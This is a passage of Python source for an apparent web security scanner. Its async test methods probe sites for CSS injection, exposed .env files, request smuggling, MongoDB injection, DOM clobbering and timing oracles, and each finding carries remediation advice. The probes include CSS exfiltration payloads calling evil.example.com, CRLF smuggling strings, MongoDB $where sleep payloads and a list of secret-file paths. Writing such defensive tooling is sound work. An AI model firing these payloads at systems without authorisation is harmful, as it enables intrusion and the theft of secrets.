                                ["https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Memory",
                                 "https://web.dev/coop-coep/"],
                                cvss_score=5.3,
                                module="wasm_memory_corruption",
                            )))
                            break

            # Check for edge runtime indicators and misconfigurations
            for url in surface.urls[:20]:
                if self._check_kill():
                    break
                resp = await self._get(client, url)
                if resp is None:
                    continue
                cf_ray = resp.headers.get("cf-ray", "")
                x_vercel = resp.headers.get("x-vercel-id", "")
                x_deno = resp.headers.get("x-deno-runtime", "")
                if cf_ray or x_vercel or x_deno:
                    runtime = "Cloudflare Workers" if cf_ray else ("Vercel Edge" if x_vercel else "Deno Deploy")
                    findings.append(self._add_advanced_finding(self._finding(
                        "wasm_memory_corruption",
                        f"Edge Runtime Detected — {runtime}",
                        WebRiskLevel.INFO,
                        0.90,
                        url, "",
                        f"Application is running on {runtime} edge runtime. Edge runtimes have "
                        "distinct V8 isolate boundaries and WASM JIT compilation paths that may "
                        "be susceptible to sandbox escape vulnerabilities.",
                        f"Edge runtime headers detected: cf-ray={cf_ray}, x-vercel-id={x_vercel}",
                        f"Keep {runtime} runtime updated. Monitor vendor security advisories for "
                        "V8 JIT and WASM sandbox escape CVEs. Audit WASM modules deployed to edge.",
                        ["https://developers.cloudflare.com/workers/learning/security-model/",
                         "https://deno.com/blog/v8-isolates-security"],
                        cvss_score=0.0,
                        module="wasm_memory_corruption",
                    )))
                    break  # One finding per target is sufficient

        return findings

    # ── 3. CSS Container Query Injection (Layout Timing Exfiltration) ─────

    async def run_css_container_injection_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect CSS injection vectors exploitable via container queries and :has()
        selectors for timing-based data exfiltration.
        """
        findings: list[WebFinding] = []

        css_injection_payloads = [
            "@container(min-width:1px){*{background:url(//evil.example.com/leak?)}}",
            "*:has(input[value^=a]){background:url(//evil.example.com/a)}",
            "@media(min-width:1px){*{--x:url(//evil.example.com/css-exfil)}}",
            "}</style><style>@container(min-width:1px){body{background:red}}",
        ]

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    for payload in css_injection_payloads[:2]:
                        resp = await self._get(client, url, params={param: payload})
                        if resp is None:
                            continue
                        if payload[:20] in resp.text or "@container" in resp.text:
                            findings.append(self._add_advanced_finding(self._finding(
                                "css_container_injection",
                                f"CSS Container Query Injection — {param}",
                                WebRiskLevel.HIGH,
                                0.80,
                                url, param,
                                "CSS container query payload was reflected unescaped in the response. "
                                "An attacker can use @container and :has() selectors to exfiltrate "
                                "sensitive DOM content via timing side channels or CSS-based data leakage.",
                                f"CSS payload reflected: '{payload[:80]}'",
                                "HTML-encode all user input before reflecting in HTML/CSS contexts. "
                                "Apply a strict CSP with style-src 'self' or nonces. "
                                "Disable style injection via Content-Security-Policy.",
                                ["https://portswigger.net/research/css-injection",
                                 "https://owasp.org/www-community/attacks/xss/"],
                                cvss_score=7.1,
                                module="css_container_injection",
                            )))
                            break

            # Check for CSS injection in forms
            for form in surface.forms:
                if self._check_kill():
                    break
                action = form["resolved_action"]
                method = form["method"]
                for inp in form["inputs"]:
                    if inp["type"] in ("submit", "button", "hidden", "image"):
                        continue
                    payload = "@container(min-width:1px){*{color:red}}"
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    resp = await (self._post(client, action, data=data)
                                  if method == "POST"
                                  else self._get(client, action, params=data))
                    if resp and "@container" in resp.text and "html" in resp.headers.get("content-type", ""):
                        findings.append(self._add_advanced_finding(self._finding(
                            "css_container_injection",
                            f"CSS Container Query Injection via Form — {inp['name']}",
                            WebRiskLevel.HIGH,
                            0.75,
                            action, inp["name"],
                            "CSS @container rule reflected unescaped in HTML response via form input.",
                            f"CSS payload reflected in form submission at {action}",
                            "Sanitise and escape all user-supplied values before embedding in HTML. "
                            "Enforce a strict Content-Security-Policy.",
                            ["https://portswigger.net/research/css-injection"],
                            cvss_score=7.1,
                            module="css_container_injection",
                        )))

            # Scan JS files for CSS injection sinks
            for js_url in surface.js_files[:10]:
                if self._check_kill():
                    break
                resp = await self._get(client, js_url)
                if resp and _CSS_EXFIL_RE.search(resp.text):
                    findings.append(self._add_advanced_finding(self._finding(
                        "css_container_injection",
                        f"CSS Container Query Patterns in JS — {js_url}",
                        WebRiskLevel.LOW,
                        0.50,
                        js_url, "",
                        "JavaScript file references CSS container query features (@container, :has) "
                        "which could be abused for timing-based data exfiltration if user input "
                        "reaches a CSS injection sink.",
                        f"CSS exfil patterns found in {js_url}",
                        "Audit dynamic style injection code paths. "
                        "Sanitise any user-controlled values written to CSS.",
                        ["https://portswigger.net/research/css-injection"],
                        cvss_score=2.5,
                        module="css_container_injection",
                    )))

        return findings

    # ── 4. HTTP/3 Stream Side Channels (QUIC Stream Isolation Bypass) ─────

    async def run_http3_stream_side_channel_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect HTTP/3 QUIC stream isolation weaknesses that may enable
        cross-stream timing attacks or header leakage.
        """
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            try:
                resp = await self._get(client, surface.base_url)
                if resp is None:
                    return findings

                # Check if server supports HTTP/3
                alt_svc = resp.headers.get("alt-svc", "")
                if "h3" not in alt_svc and resp.http_version not in ("HTTP/3", "h3"):
                    return findings

                findings.append(self._add_advanced_finding(self._finding(
                    "http3_stream_side_channel",
                    "HTTP/3 (QUIC) Enabled — Stream Side Channel Risk",
                    WebRiskLevel.INFO,
                    0.85,
                    surface.base_url, "Alt-Svc",
                    "The server advertises HTTP/3 support. HTTP/3 QUIC stream multiplexing "
                    "may be susceptible to cross-stream timing attacks that leak information "
                    "about concurrent requests on the same QUIC connection.",
                    f"Alt-Svc: {alt_svc} | HTTP version: {resp.http_version}",
                    "Monitor QUIC stream isolation in your HTTP/3 implementation. "
                    "Apply request coalescing mitigations. "
                    "Keep HTTP/3 stack (nginx/quiche, Caddy, LiteSpeed) updated.",
                    ["https://www.rfc-editor.org/rfc/rfc9000",
                     "https://portswigger.net/research/http2"],
                    cvss_score=3.1,
                    module="http3_stream_side_channel",
                )))

                # Test for stream-level header leakage via simultaneous requests
                timing_results: list[float] = []
                for _ in range(5):
                    if self._check_kill():
                        break
                    t0 = time.monotonic()
                    await self._get(client, surface.base_url)
                    timing_results.append(time.monotonic() - t0)

                if len(timing_results) >= 4:
                    variance = max(timing_results) - min(timing_results)
                    if variance > 1.5:
                        findings.append(self._add_advanced_finding(self._finding(
                            "http3_stream_side_channel",
                            "HTTP/3 High Response Timing Variance (Side Channel Risk)",
                            WebRiskLevel.LOW,
                            0.45,
                            surface.base_url, "",
                            f"HTTP/3 responses show high timing variance ({variance:.2f}s) across "
                            "identical requests, suggesting possible stream isolation weakness or "
                            "server-side processing timing leak exploitable via QUIC streams.",
                            f"Timing variance: {variance:.3f}s over {len(timing_results)} samples. "
                            f"Min={min(timing_results):.3f}s Max={max(timing_results):.3f}s",
                            "Implement constant-time response processing for sensitive operations. "
                            "Use HTTP/3 stream priorities carefully. "
                            "Apply timing jitter for authentication endpoints.",
                            ["https://owasp.org/www-community/attacks/Timing_attack"],
                            cvss_score=3.7,
                            module="http3_stream_side_channel",
                        )))

            except Exception as exc:
                logger.debug("HTTP/3 side channel test failed: %s", exc)

        return findings

    # ── 5. Environment Variable Leakage (ESM import.meta.resolve) ─────────

    async def run_env_var_leakage_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect environment variable leakage via exposed API endpoints,
        error messages, and ESM import.meta.env patterns.
        """
        findings: list[WebFinding] = []

        env_leak_paths = [
            "/.env", "/.env.local", "/.env.development", "/.env.production",
            "/.env.staging", "/.env.test", "/.env.example", "/.env.sample",
            "/config.js", "/config.json", "/settings.js", "/app.config.js",
            "/vite.config.js", "/next.config.js", "/nuxt.config.js",
            "/api/config", "/api/env", "/api/settings", "/api/debug/env",
            "/__ENV", "/env.js", "/runtime-config.js", "/public/env-config.js",
        ]

        esm_env_re = re.compile(
            r"import\.meta\.env\.|process\.env\.|VITE_[A-Z_]+\s*=|NEXT_PUBLIC_[A-Z_]+\s*=",
            re.I,
        )

        async with self._make_client() as client:
            base = surface.base_url.rstrip("/")

            for path in env_leak_paths:
                if self._check_kill():
                    break
                url = f"{base}{path}"
                resp = await self._get(client, url)
                if resp is None or resp.status_code != 200:
                    continue
                content = resp.text[:3000]

                # Check for actual secret content
                sev = WebRiskLevel.MEDIUM
                conf = 0.70
                if _SENSITIVE_CONTENT_RE.search(content):
                    sev = WebRiskLevel.CRITICAL
                    conf = 0.95
                elif esm_env_re.search(content):
                    sev = WebRiskLevel.HIGH
                    conf = 0.85

                findings.append(self._add_advanced_finding(self._finding(
                    "env_var_leakage",
                    f"Environment Variable File Exposed — {path}",
                    sev, conf,
                    url, "",
                    f"Configuration/environment file at '{path}' returned HTTP 200. "
                    + ("Contains sensitive credentials or secret keys." if sev == WebRiskLevel.CRITICAL
                       else "Contains environment variable definitions that may include secrets."),
                    f"HTTP 200 for {url}. Content preview: {content[:200]}",
                    "Block access to all environment/config files via web server rules. "
                    "Never commit .env files to version control. "
                    "Use a secrets manager (Vault, AWS Secrets Manager) instead of .env files in production.",
                    ["https://owasp.org/www-project-web-security-testing-guide/",
                     "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"],
                    cvss_score=9.1 if sev == WebRiskLevel.CRITICAL else (7.5 if sev == WebRiskLevel.HIGH else 5.3),
                    module="env_var_leakage",
                )))

            # Check JS files for exposed ESM import.meta.env values
            for js_url in surface.js_files[:20]:
                if self._check_kill():
                    break
                resp = await self._get(client, js_url)
                if resp is None or resp.status_code != 200:
                    continue
                if _SENSITIVE_CONTENT_RE.search(resp.text) and esm_env_re.search(resp.text):
                    findings.append(self._add_advanced_finding(self._finding(
                        "env_var_leakage",
                        f"Secrets in Bundled JS (ESM import.meta.env) — {js_url}",
                        WebRiskLevel.HIGH,
                        0.80,
                        js_url, "",
                        "Bundled JavaScript file contains what appear to be hardcoded secrets or "
                        "environment variable values leaked via import.meta.env or process.env inlining.",
                        f"Sensitive pattern + ESM env reference found in {js_url}",
                        "Never bundle server-side secrets into client-facing JS. "
                        "Use NEXT_PUBLIC_ / VITE_ prefixes only for non-secret config. "
                        "Rotate any exposed secrets immediately.",
                        ["https://vitejs.dev/guide/env-and-mode.html#security-notes"],
                        cvss_score=7.5,
                        module="env_var_leakage",
                    )))

        return findings

    # ── 6. Async Hooks Context Poisoning ──────────────────────────────────

    async def run_async_hooks_poisoning_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect AsyncLocalStorage/async hooks context contamination vulnerabilities
        in Node.js applications where request context leaks between users.
        """
        findings: list[WebFinding] = []

        # Probes that may trigger context contamination in Node.js async context
        poison_probes = [
            {"X-Request-ID": f"poison-{uuid.uuid4().hex[:8]}"},
            {"X-Correlation-ID": f"ctx-leak-{uuid.uuid4().hex[:8]}"},
            {"X-Trace-ID": f"trace-{uuid.uuid4().hex[:8]}"},
        ]

        async with self._make_client() as client:
            for probe_headers in poison_probes:
                if self._check_kill():
                    break
                marker = list(probe_headers.values())[0]

                # Send poisoned request
                resp1 = await self._get(client, surface.base_url, headers=probe_headers)
                if resp1 is None:
                    continue

                # Send clean follow-up request without poison header
                resp2 = await self._get(client, surface.base_url)
                if resp2 is None:
                    continue

                # Check if marker leaked into subsequent response
                if marker in (resp2.text or ""):
                    findings.append(self._add_advanced_finding(self._finding(
                        "async_hooks_poisoning",
                        f"Async Context Leakage — {list(probe_headers.keys())[0]}",
                        WebRiskLevel.CRITICAL,
                        0.88,
                        surface.base_url, list(probe_headers.keys())[0],
                        "A request-scoped header value appeared in a subsequent request's response "
                        "without that header being sent. This indicates AsyncLocalStorage context "
                        "contamination between requests — a server-side session isolation failure.",
                        f"Marker '{marker}' from request 1 found in request 2 response",
                        "Ensure AsyncLocalStorage stores are properly scoped to individual requests. "
                        "Use asyncLocalStorage.run() to create isolated contexts per request. "
                        "Audit middleware for shared mutable state across async boundaries.",
                        ["https://nodejs.org/api/async_context.html",
                         "https://owasp.org/www-community/attacks/Session_fixation"],
                        cvss_score=9.1,
                        module="async_hooks_poisoning",
                    )))

            # Check for Node.js-specific headers that indicate async runtime
            resp = await self._get(client, surface.base_url)
            if resp:
                x_powered = resp.headers.get("x-powered-by", "").lower()
                if "express" in x_powered or "node" in x_powered:
                    # Check for common async context leak patterns in API endpoints
                    for api_url in surface.api_endpoints[:5]:
                        if self._check_kill():
                            break
                        r1 = await self._get(client, api_url, headers={"X-User-Context": "user-a"})
                        r2 = await self._get(client, api_url, headers={"X-User-Context": "user-b"})
                        if r1 and r2 and r1.status_code == r2.status_code == 200:
                            # Look for cross-contamination indicators
                            if "user-a" in (r2.text or "") and "user-a" not in api_url:
                                findings.append(self._add_advanced_finding(self._finding(
                                    "async_hooks_poisoning",
                                    f"Cross-Request Context Contamination — {api_url}",
                                    WebRiskLevel.HIGH,
                                    0.70,
                                    api_url, "X-User-Context",
                                    "Request context value from one user appeared in another "
                                    "user's response, indicating async hooks context poisoning.",
                                    f"'user-a' context appeared in 'user-b' request response at {api_url}",
                                    "Isolate request context using AsyncLocalStorage.run(). "
                                    "Avoid closure-captured mutable state in async middleware.",
                                    ["https://nodejs.org/api/async_context.html"],
                                    cvss_score=8.6,
                                    module="async_hooks_poisoning",
                                )))

        return findings

    # ── 7. HTTP Smuggling over WebTransport ───────────────────────────────

    async def run_http_smuggling_webtransport_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect HTTP smuggling vulnerabilities via WebTransport (QUIC) pseudo-header injection.
        Tests for H3-to-H1 desync when WebTransport streams are involved.
        """
        findings: list[WebFinding] = []

        smuggle_payloads = [
            # QUIC/H3 pseudo-header injection attempts
            "\r\nTransfer-Encoding: chunked\r\nContent-Length: 0",
            "\x00Transfer-Encoding: chunked",
            "\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
        ]

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    for payload in smuggle_payloads[:2]:
                        encoded = payload.replace("\r", "%0d").replace("\n", "%0a").replace("\x00", "%00")
                        resp = await self._get(client, url, params={param: encoded})
                        if resp is None:
                            continue
                        # A 400 or unusual response may indicate the server processed the injection
                        if resp.status_code in (400, 501) or len(resp.text) > 5000:
                            findings.append(self._add_advanced_finding(self._finding(
                                "http_smuggling_webtransport",
                                f"Possible HTTP Request Smuggling via Header Injection — {param}",
                                WebRiskLevel.HIGH,
                                0.55,
                                url, param,
                                "URL parameter containing CRLF/null-byte header injection sequences "
                                "produced an anomalous server response, suggesting potential HTTP "
                                "request smuggling vector in HTTP/3 or WebTransport path.",
                                f"Payload with CRLF injection in '{param}' → HTTP {resp.status_code}",
                                "Validate and strip CRLF/null bytes from all user input before "
                                "forwarding to backend proxies. Ensure consistent CL/TE handling "
                                "between HTTP/3 frontend and HTTP/1.1 backend. "
                                "Use a WAF that normalises QUIC pseudo-headers.",
                                ["https://portswigger.net/web-security/request-smuggling",
                                 "https://www.rfc-editor.org/rfc/rfc9114"],
                                cvss_score=7.5,
                                module="http_smuggling_webtransport",
                            )))
                            break

            # Check for WebTransport endpoint exposure
            for ws_url in surface.websocket_endpoints[:5]:
                if self._check_kill():
                    break
                if "wt://" in ws_url or "webtransport" in ws_url.lower():
                    findings.append(self._add_advanced_finding(self._finding(
                        "http_smuggling_webtransport",
                        f"WebTransport Endpoint Detected — {ws_url}",
                        WebRiskLevel.MEDIUM,
                        0.70,
                        ws_url, "",
                        "A WebTransport endpoint was discovered. WebTransport over QUIC may be "
                        "susceptible to stream pseudo-header injection if the backend proxy "
                        "does not properly validate :method, :path, and :authority pseudo-headers.",
                        f"WebTransport endpoint at {ws_url}",
                        "Validate all QUIC stream pseudo-headers server-side. "
                        "Ensure consistent header parsing between WebTransport and HTTP/1.1 backends.",
                        ["https://www.rfc-editor.org/rfc/rfc9114"],
                        cvss_score=5.3,
                        module="http_smuggling_webtransport",
                    )))

        return findings

    # ── 8. MongoDB Aggregation Pipeline Injection ─────────────────────────

    async def run_mongodb_aggregation_injection_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect MongoDB injection via aggregation pipeline operators including
        $accumulator, $function (server-side JS execution), and $where.
        """
        findings: list[WebFinding] = []

        mongo_payloads = [
            # Classic NoSQL injection
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            # Aggregation pipeline injection
            '{"$where": "sleep(5000)"}',
            # $function injection (MongoDB 4.4+ server-side JS)
            '{"$function": {"body": "function(){return true}", "args": [], "lang": "js"}}',
            # Array operator abuse
            '{"$in": ["a","b","c","d","e","f","g","h","i","j"]}',
        ]

        error_indicators = re.compile(
            r"MongoError|mongodb|bson|ObjectId|aggregation|pipeline|"
            r"\$where|\$function|\$accumulator|uncaught exception",
            re.I,
        )

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    for payload in mongo_payloads[:4]:
                        if self._check_kill():
                            break
                        # Try JSON payload in parameter
                        resp = await self._get(client, url, params={param: payload})
                        if resp is None:
                            continue
                        if error_indicators.search(resp.text or ""):
                            findings.append(self._add_advanced_finding(self._finding(
                                "mongodb_injection",
                                f"MongoDB Injection (Error-Based) — {param}",
                                WebRiskLevel.CRITICAL,
                                0.87,
                                url, param,
                                "MongoDB operator keyword or error was reflected in the response "
                                "when an aggregation pipeline payload was injected, indicating "
                                "unsanitised NoSQL query construction.",
                                f"MongoDB error/keyword in response to payload '{payload[:80]}' on '{param}'",
                                "Use MongoDB parameterised queries (BSON). "
                                "Sanitise all user input using $type/$regex validation. "
                                "Disable JavaScript execution in MongoDB (security.javascriptEnabled: false). "
                                "Avoid $where, $function, and $accumulator with user input.",
                                ["https://owasp.org/www-community/attacks/NoSQL_Injection",
                                 "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html"],
                                cvss_score=9.0,
                                module="mongodb_injection",
                            )))
                            break

                        # Timing-based $where test
                        if "$where" in payload:
                            t0 = time.monotonic()
                            await self._get(client, url, params={param: '{"$where":"function(){var s=new Date();while(new Date()-s<5000){}return true}"}'})
                            elapsed = time.monotonic() - t0
                            if elapsed >= self._timing_thresh:
                                findings.append(self._add_advanced_finding(self._finding(
                                    "mongodb_injection",
                                    f"MongoDB Injection (Time-Based, $where) — {param}",
                                    WebRiskLevel.CRITICAL,
                                    0.82,
                                    url, param,
                                    f"MongoDB $where JavaScript sleep payload caused {elapsed:.1f}s delay, "
                                    "confirming server-side JavaScript execution via NoSQL injection.",
                                    f"$where sleep payload caused {elapsed:.1f}s delay on '{param}'",
                                    "Disable server-side JavaScript in MongoDB. "
                                    "Reject queries containing $where or $function operators. "
                                    "Use parameterised queries throughout.",
                                    ["https://www.mongodb.com/docs/manual/core/server-side-javascript/"],
                                    cvss_score=9.5,
                                    module="mongodb_injection",
                                )))

            # Test JSON POST bodies for API endpoints
            for api_url in surface.api_endpoints[:10]:
                if self._check_kill():
                    break
                for payload in [
                    {"filter": {"$where": "1==1"}},
                    {"query": {"$accumulator": {"init": "function(){}", "accumulate": "function(){}", "merge": "function(){}", "lang": "js"}}},
                    {"search": {"$function": {"body": "function(){return true}", "args": [], "lang": "js"}}},
                ]:
                    resp = await self._post(
                        client, api_url,
                        json_=payload,
                        headers={"Content-Type": "application/json"},
                    )
                    if resp and error_indicators.search(resp.text or ""):
                        findings.append(self._add_advanced_finding(self._finding(
                            "mongodb_injection",
                            f"MongoDB Aggregation Pipeline Injection (API) — {api_url}",
                            WebRiskLevel.CRITICAL,
                            0.85,
                            api_url, "request body",
                            "MongoDB aggregation pipeline operator in JSON POST body triggered "
                            "a MongoDB error, indicating unsafe query construction from user input.",
                            f"MongoDB error in response to pipeline payload at {api_url}",
                            "Validate and strip MongoDB operators from user-supplied JSON. "
                            "Use an ODM (Mongoose) with schema validation. "
                            "Block $where, $function, $accumulator at the application layer.",
                            ["https://owasp.org/www-community/attacks/NoSQL_Injection"],
                            cvss_score=9.0,
                            module="mongodb_injection",
                        )))
                        break

        return findings

    # ── 9. DOM Clobbering (Sandbox Bypass via id/name overrides) ──────────

    async def run_dom_clobbering_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect DOM clobbering vulnerabilities where id/name attributes can
        override global JavaScript properties and bypass sandboxing.
        """
        findings: list[WebFinding] = []

        dom_clobber_payloads = [
            '<form id="document"><input name="cookie" value="clobbered"></form>',
            '<a id="location" href="javascript:void(0)">x</a>',
            '<img name="getElementById">',
            '<form name="alert"><input name="apply"></form>',
            '<a id="__proto__" name="polluted">x</a>',
        ]

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    for payload in dom_clobber_payloads[:3]:
                        resp = await self._get(client, url, params={param: payload})
                        if resp is None:
                            continue
                        ct = resp.headers.get("content-type", "")
                        if "html" not in ct:
                            continue
                        if 'id="document"' in resp.text or 'name="getElementById"' in resp.text or 'id="location"' in resp.text:
                            findings.append(self._add_advanced_finding(self._finding(
                                "dom_clobbering",
                                f"DOM Clobbering via HTML Injection — {param}",
                                WebRiskLevel.HIGH,
                                0.82,
                                url, param,
                                "HTML with id/name attributes that clobber global DOM properties "
                                "was reflected unescaped in the page. This can bypass script "
                                "sandboxing, XSS filters, or CSP by hijacking trusted DOM APIs.",
                                f"DOM clobbering payload reflected: '{payload[:80]}'",
                                "HTML-encode all user input. "
                                "Use DOMPurify with FORCE_BODY option to strip id/name clobbering. "
                                "Avoid accessing global properties via window.x or bare identifiers.",
                                ["https://portswigger.net/web-security/dom-based/dom-clobbering",
                                 "https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object"],
                                cvss_score=7.5,
                                module="dom_clobbering",
                            )))
                            break

            # Check JS files for DOM clobbering sinks
            dom_clobber_sink_re = re.compile(
                r"window\[|window\.|document\.getElementById\s*\(\s*\w+\s*\)|"
                r"document\.\w+\s*\.\s*\w+|globalThis\.\w+",
                re.I,
            )
            for js_url in surface.js_files[:15]:
                if self._check_kill():
                    break
                resp = await self._get(client, js_url)
                if resp and dom_clobber_sink_re.search(resp.text):
                    findings.append(self._add_advanced_finding(self._finding(
                        "dom_clobbering",
                        f"DOM Clobbering Sink in JavaScript — {js_url}",
                        WebRiskLevel.MEDIUM,
                        0.50,
                        js_url, "",
                        "JavaScript file accesses global DOM properties (window.x, document.x) "
                        "in ways that may be clobbered by injected HTML with matching id/name attributes.",
                        f"DOM clobbering sink pattern found in {js_url}",
                        "Use explicit getElementById() with constant strings. "
                        "Avoid relying on named access to the window object.",
                        ["https://portswigger.net/web-security/dom-based/dom-clobbering"],
                        cvss_score=4.3,
                        module="dom_clobbering",
                    )))

        return findings

    # ── 10. Server-Timing Header Side Channels ────────────────────────────

    async def run_server_timing_side_channel_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect information leakage via Server-Timing headers that expose
        sub-millisecond operation timing, enabling blind SQL injection
        and authentication bypass via timing oracles.
        """
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            # First check if Server-Timing is present at all
            resp = await self._get(client, surface.base_url)
            if resp is None:
                return findings

            server_timing = resp.headers.get("server-timing", "")
            timing_allow = resp.headers.get("timing-allow-origin", "")

            if server_timing:
                # Parse timing metrics to check for sensitive labels
                sensitive_labels = re.compile(
                    r"db|sql|query|auth|cache|redis|mongo|postgres|mysql|"
                    r"session|token|jwt|user|password|secret",
                    re.I,
                )
                if sensitive_labels.search(server_timing):
                    findings.append(self._add_advanced_finding(self._finding(
                        "server_timing_side_channel",
                        "Server-Timing Header Exposes Sensitive Operation Labels",
                        WebRiskLevel.MEDIUM,
                        0.90,
                        surface.base_url, "Server-Timing",
                        "The Server-Timing header exposes metric names that reveal internal "
                        "infrastructure details (database type, auth system, caching layer). "
                        "Combined with timing values, this enables blind timing attacks.",
                        f"Server-Timing: {server_timing[:300]}",
                        "Remove or sanitise Server-Timing labels in production. "
                        "Never use names that expose infrastructure (use opaque IDs instead). "
                        "Restrict Server-Timing to same-origin via Timing-Allow-Origin.",
                        ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server-Timing",
                         "https://www.w3.org/TR/server-timing/"],
                        cvss_score=5.3,
                        module="server_timing_side_channel",
                    )))

            if timing_allow == "*":
                findings.append(self._add_advanced_finding(self._finding(
                    "server_timing_side_channel",
                    "Server-Timing Exposed to All Origins (Timing-Allow-Origin: *)",
                    WebRiskLevel.MEDIUM,
                    0.95,
                    surface.base_url, "Timing-Allow-Origin",
                    "Timing-Allow-Origin: * allows any cross-origin page to read precise "
                    "Server-Timing values via the Resource Timing API, enabling cross-origin "
                    "timing attacks against authenticated endpoints.",
                    f"Timing-Allow-Origin: {timing_allow}",
                    "Set Timing-Allow-Origin to specific trusted origins, not wildcard. "
                    "Do not expose sub-millisecond timing on authentication endpoints.",
                    ["https://www.w3.org/TR/resource-timing/#sec-timing-allow-origin"],
                    cvss_score=5.8,
                    module="server_timing_side_channel",
                )))

            # Timing oracle attack on auth parameters
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    if not re.search(r"user|email|pass|token|key|id", param, re.I):
                        continue
                    timings: list[float] = []
                    for val in ["admin", "nonexistent_user_xyz_12345"]:
                        t0 = time.monotonic()
                        r = await self._get(client, url, params={param: val})
                        elapsed = time.monotonic() - t0
                        if r:
                            st = r.headers.get("server-timing", "")
                            if st:
                                timings.append(elapsed)
                    if len(timings) == 2 and abs(timings[0] - timings[1]) > 0.3:
                        findings.append(self._add_advanced_finding(self._finding(
                            "server_timing_side_channel",
                            f"Timing Oracle via Server-Timing on Auth Parameter — {param}",
                            WebRiskLevel.HIGH,
                            0.65,
                            url, param,
                            f"Significant timing difference ({abs(timings[0]-timings[1]):.3f}s) "
                            "observed between valid and invalid values with Server-Timing present, "
                            "indicating a timing oracle for user enumeration or blind data extraction.",
                            f"Timing delta={abs(timings[0]-timings[1]):.3f}s for '{param}' on {url}",
                            "Implement constant-time comparison for authentication checks. "
                            "Use HMAC-based comparison (hmac.compare_digest). "
                            "Add random jitter to auth endpoint responses.",
                            ["https://owasp.org/www-community/attacks/Timing_attack"],
                            cvss_score=6.5,
                            module="server_timing_side_channel",
                        )))

        return findings

    # ── 11. Web Crypto API Timing Attacks ────────────────────────────────

    async def run_web_crypto_timing_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect timing vulnerabilities in Web Crypto API usage patterns
        via non-constant-time comparison of cryptographic material.
        """
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            # Probe API endpoints for timing differences on crypto operations
            for api_url in surface.api_endpoints[:10]:
                if self._check_kill():
                    break

                # Test with valid-format vs invalid-format tokens
                test_cases = [
                    ("valid_format_hmac", "a" * 64),      # 64-char hex (typical HMAC)
                    ("invalid_short",     "a" * 4),
                    ("invalid_long",      "a" * 256),
                    ("empty",             ""),
                ]

                timings: dict[str, float] = {}
                for label, value in test_cases:
                    t0 = time.monotonic()
                    await self._get(
                        client, api_url,
                        headers={"Authorization": f"HMAC {value}", "X-Signature": value},
                    )
                    timings[label] = time.monotonic() - t0

                # If valid_format takes significantly longer, it may be doing non-constant-time compare
                if timings.get("valid_format_hmac", 0) > timings.get("invalid_short", 0) + 0.5:
                    findings.append(self._add_advanced_finding(self._finding(
                        "web_crypto_timing",
                        f"Crypto Timing Vulnerability (Non-Constant-Time Comparison) — {api_url}",
                        WebRiskLevel.HIGH,
                        0.60,
                        api_url, "Authorization",
                        "Significant timing difference observed between HMAC token formats, "
                        "suggesting non-constant-time comparison of cryptographic values. "
                        "This enables key/token recovery via timing oracle.",
                        f"Timing: valid_format={timings.get('valid_format_hmac', 0):.3f}s, "
                        f"invalid_short={timings.get('invalid_short', 0):.3f}s",
                        "Use hmac.compare_digest() or constant_time.bytes_eq() for all "
                        "cryptographic comparisons. Never use == or != for secret comparison. "
                        "Add response timing jitter to sensitive endpoints.",
                        ["https://codahale.com/a-lesson-in-timing-attacks/",
                         "https://owasp.org/www-community/attacks/Timing_attack"],
                        cvss_score=6.8,
                        module="web_crypto_timing",
                    )))

            # Check JS files for non-constant-time crypto patterns
            unsafe_crypto_re = re.compile(
                r"===\s*signature|signature\s*===|==\s*hash|hash\s*==|"
                r"digest\s*!==|!==\s*digest|token\s*==|==\s*token",
                re.I,
            )
            for js_url in surface.js_files[:20]:
                if self._check_kill():
                    break
                resp = await self._get(client, js_url)
                if resp and unsafe_crypto_re.search(resp.text):
                    findings.append(self._add_advanced_finding(self._finding(
                        "web_crypto_timing",
                        f"Non-Constant-Time Crypto Comparison in JS — {js_url}",
                        WebRiskLevel.MEDIUM,
                        0.65,
                        js_url, "",
                        "JavaScript file uses equality operators (===, ==, !==) for comparing "
                        "cryptographic values (signatures, digests, tokens), enabling timing attacks.",
                        f"Non-constant-time crypto comparison pattern in {js_url}",
                        "Use crypto.timingSafeEqual() from Node.js crypto module for all "
                        "cryptographic comparisons in server-side JS. "
                        "Never use string equality for HMAC/signature verification.",
                        ["https://nodejs.org/api/crypto.html#cryptotimingsafeequala-b"],
                        cvss_score=5.9,
                        module="web_crypto_timing",
                    )))

        return findings

    # ── 12. Import Map Override (SharedWorker Cross-Tab Injection) ────────

    async def run_import_map_override_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect import map injection vulnerabilities that allow module URL
        overrides via SharedWorker cross-tab injection.
        """
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            # Check for existing import maps
            if surface.import_maps:
                for import_map_content in surface.import_maps[:3]:
                    try:
                        imap = json.loads(import_map_content)
                        imports = imap.get("imports", {})
                        # Check if import map uses external/CDN URLs
                        for module, url in imports.items():
